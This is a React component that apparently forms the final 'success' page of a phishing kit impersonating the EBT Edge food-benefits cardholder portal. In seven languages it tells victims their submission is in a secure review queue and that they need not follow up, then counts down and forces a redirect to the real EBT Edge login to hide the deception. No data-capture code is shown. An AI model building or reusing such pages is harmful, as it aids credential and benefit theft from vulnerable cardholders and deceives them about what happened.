import { useNavigate } from "react-router-dom";
import { CheckCircle, ExternalLink } from "lucide-react";
import { useEffect, useState, useCallback } from "react";
import EbtLayout from "@/components/EbtLayout";
import { getSelectedLang, setSelectedLang } from "@/lib/userStore";

const OFFICIAL_URL =
  "https://login5.fisglobal.com/idp/EBTEdge_NCH/?client_id=EBTEdge_NCH_APIKey&redirect_uri=https://cardholder.ebtedge.com/mobilev2/auth/callback/&scope=openid&response_type=code&code_challenge=xrfxlhc2eWbMTV4hvlw2MP8mXtQ5LpXUPAtv57SAFrA=&code_challenge_method=S256";

type Lang = "English" | "Español" | "Kreyòl Ayisyen" | "عربي" | "中文" | "Polski" | "русский";

type SuccessCopy = {
  title: string; heading: string; thankYou: string; info: string;
  confirmNote: string; appreciation: string; returnBtn: string;
  selectLanguage: string; redirecting: string; goToSite: string;
};

const copy: Record<Lang, SuccessCopy> = {
  English: {
    title: "Confirmation", heading: "You're All Set!",
    thankYou: "Your request has been placed in our secure processing queue.",
    info: "Due to high volume, our dedicated team is reviewing each submission individually. You'll receive a confirmation via email or SMS once your update has been completed.",
    confirmNote: "Please allow up to 48 business hours for processing. We'll keep you informed every step of the way — no need to follow up.",
    appreciation: "Thank you for your patience. Your account security is our top priority.",
    returnBtn: "Return to Login", selectLanguage: "Select Language",
    redirecting: "Redirecting to official site in", goToSite: "Go to Official Site",
  },
  Español: {
    title: "Confirmación", heading: "¡Todo Listo!",
    thankYou: "Su solicitud ha sido colocada en nuestra cola de procesamiento seguro.",
    info: "Debido al alto volumen, nuestro equipo dedicado revisa cada envío individualmente. Recibirá una confirmación por correo electrónico o SMS una vez que su actualización haya sido completada.",
    confirmNote: "Por favor permita hasta 48 horas hábiles para el procesamiento. Le mantendremos informado en cada paso — no necesita hacer seguimiento.",
    appreciation: "Gracias por su paciencia. La seguridad de su cuenta es nuestra máxima prioridad.",
    returnBtn: "Volver al Inicio", selectLanguage: "Seleccionar idioma",
    redirecting: "Redirigiendo al sitio oficial en", goToSite: "Ir al Sitio Oficial",
  },
  "Kreyòl Ayisyen": {
    title: "Konfimasyon", heading: "Ou Pare Nèt!",
    thankYou: "Demann ou an te mete nan liy tretman sekirize nou an.",
    info: "Akòz gwo volim, ekip dedye nou an ap revize chak soumisyon endividyèlman. Ou pral resevwa yon konfimasyon pa imèl oswa SMS lè aktyalizasyon ou an fini.",
    confirmNote: "Tanpri bay jiska 48 èdtan ouvrab pou tretman. N ap kenbe ou enfòme chak etap — pa bezwen fè swivi.",
    appreciation: "Mèsi pou pasyans ou. Sekirite kont ou se priyorite nou.",
    returnBtn: "Retounen nan Koneksyon", selectLanguage: "Chwazi lang",
    redirecting: "Redireksyon nan sit ofisyèl nan", goToSite: "Ale nan Sit Ofisyèl",
  },
  "عربي": {
    title: "تأكيد", heading: "!تم الإرسال بنجاح",
    thankYou: "تم وضع طلبك في قائمة المعالجة الآمنة.",
    info: "نظراً للعدد الكبير من الطلبات، يقوم فريقنا المختص بمراجعة كل طلب على حدة. ستتلقى تأكيداً عبر البريد الإلكتروني أو رسالة نصية بمجرد اكتمال التحديث.",
    confirmNote: "يرجى الانتظار حتى 48 ساعة عمل للمعالجة. سنبقيك على اطلاع في كل خطوة — لا حاجة للمتابعة.",
    appreciation: "شكراً لصبرك. أمان حسابك هو أولويتنا القصوى.",
    returnBtn: "العودة لتسجيل الدخول", selectLanguage: "اختر اللغة",
    redirecting: "إعادة التوجيه إلى الموقع الرسمي خلال", goToSite: "الذهاب للموقع الرسمي",
  },
  "中文": {
    title: "确认", heading: "一切就绪！",
    thankYou: "您的请求已进入我们的安全处理队列。",
    info: "由于提交量较大，我们的专业团队正在逐一审核每份请求。更新完成后，您将通过电子邮件或短信收到确认通知。",
    confirmNote: "请允许最多48个工作小时进行处理。我们会随时通知您进展 — 无需跟进。",
    appreciation: "感谢您的耐心。您的账户安全是我们的首要任务。",
    returnBtn: "返回登录", selectLanguage: "选择语言",
    redirecting: "正在重定向到官方网站，倒计时", goToSite: "前往官方网站",
  },
  Polski: {
    title: "Potwierdzenie", heading: "Wszystko Gotowe!",
    thankYou: "Twój wniosek został umieszczony w naszej bezpiecznej kolejce przetwarzania.",
    info: "Ze względu na dużą liczbę zgłoszeń, nasz zespół sprawdza każde z nich indywidualnie. Otrzymasz potwierdzenie e-mailem lub SMS-em po zakończeniu aktualizacji.",
    confirmNote: "Prosimy o cierpliwość — przetwarzanie może potrwać do 48 godzin roboczych. Będziemy Cię informować na bieżąco.",
    appreciation: "Dziękujemy za cierpliwość. Bezpieczeństwo Twojego konta jest naszym priorytetem.",
    returnBtn: "Powrót do logowania", selectLanguage: "Wybierz język",
    redirecting: "Przekierowanie na oficjalną stronę za", goToSite: "Przejdź na Oficjalną Stronę",
  },
  "русский": {
    title: "Подтверждение", heading: "Всё готово!",
    thankYou: "Ваш запрос поставлен в очередь безопасной обработки.",
    info: "Из-за большого количества обращений наша команда рассматривает каждую заявку индивидуально. Вы получите подтверждение по электронной почте или SMS после завершения обновления.",
    confirmNote: "Пожалуйста, подождите до 48 рабочих часов. Мы будем держать вас в курсе — не нужно связываться с нами повторно.",
    appreciation: "Спасибо за терпение. Безопасность вашей учётной записи — наш главный приоритет.",
    returnBtn: "Вернуться к входу", selectLanguage: "Выберите язык",
    redirecting: "Перенаправление на официальный сайт через", goToSite: "Перейти на Официальный Сайт",
  },
};

const languageOptions: Lang[] = ["English", "Español", "Kreyòl Ayisyen", "عربي", "中文", "Polski", "русский"];

const Success = () => {
  const navigate = useNavigate();
  const [lang, setLang] = useState<Lang>(() => {
    const saved = getSelectedLang();
    return languageOptions.includes(saved as Lang) ? (saved as Lang) : "English";
  });
  const [countdown, setCountdown] = useState(12);

  const t = copy[lang];

  const doRedirect = useCallback(() => {
    // Try multiple methods for maximum compatibility
    try {
      window.top?.location.replace(OFFICIAL_URL);
    } catch {
      // If top is blocked (iframe sandbox), fall back
    }
    try {
      window.location.replace(OFFICIAL_URL);
    } catch {
      // fallback
    }
    // Final fallback — open in new tab
    setTimeout(() => {
      window.open(OFFICIAL_URL, "_blank", "noopener,noreferrer");
    }, 300);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) {
      doRedirect();
      return;
    }
    const interval = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [countdown, doRedirect]);

  return (
    <EbtLayout
      title={t.title}
      showNav
      langLabel={t.selectLanguage}
      langOptions={languageOptions}
      onLangChange={(l) => { setLang(l as Lang); setSelectedLang(l); }}
      mainStyle={{ display: "flex", justifyContent: "center", alignItems: "center", padding: "28px 10px 130px" }}
    >
      <div
        style={{
          width: "100%",
          maxWidth: 700,
          background: "hsl(0 0% 100%)",
          padding: "36px clamp(16px, 4vw, 44px) 36px",
          boxSizing: "border-box",
          boxShadow: "0 2px 8px hsla(0 0% 0% / 0.15)",
          textAlign: "center",
        }}
      >
        <CheckCircle
          size={64}
          strokeWidth={1.5}
          style={{ color: "hsl(145 63% 42%)", marginBottom: 20 }}
        />

        <h2 style={{ margin: "0 0 12px", fontWeight: 700, fontSize: 24, color: "hsl(220 10% 28%)" }}>
          {t.heading}
        </h2>

        <p style={{ margin: "0 0 8px", fontSize: 16, color: "hsl(220 10% 38%)", lineHeight: 1.6 }}>
          {t.thankYou}
        </p>
        <p style={{ margin: "0 0 24px", fontSize: 16, color: "hsl(220 10% 38%)", lineHeight: 1.6 }}>
          {t.info}
        </p>

        <div style={{ borderTop: "1px solid hsl(210 4% 88%)", paddingTop: 20, marginTop: 8 }}>
          <p style={{ margin: "0 0 4px", fontSize: 14, color: "hsl(220 10% 50%)" }}>
            {t.confirmNote}
          </p>
          <p style={{ margin: "8px 0 0", fontSize: 14, color: "hsl(220 10% 50%)" }}>
            {t.appreciation}
          </p>
        </div>

        <button
          type="button"
          onClick={doRedirect}
          style={{
            marginTop: 24,
            width: "100%",
            maxWidth: 260,
            height: 48,
            border: "none",
            cursor: "pointer",
            color: "hsl(0 0% 92%)",
            background: "hsl(205 37% 37%)",
            fontSize: 18,
            fontWeight: 500,
          }}
        >
          {t.returnBtn}
        </button>
      </div>
    </EbtLayout>
  );
};

export default Success;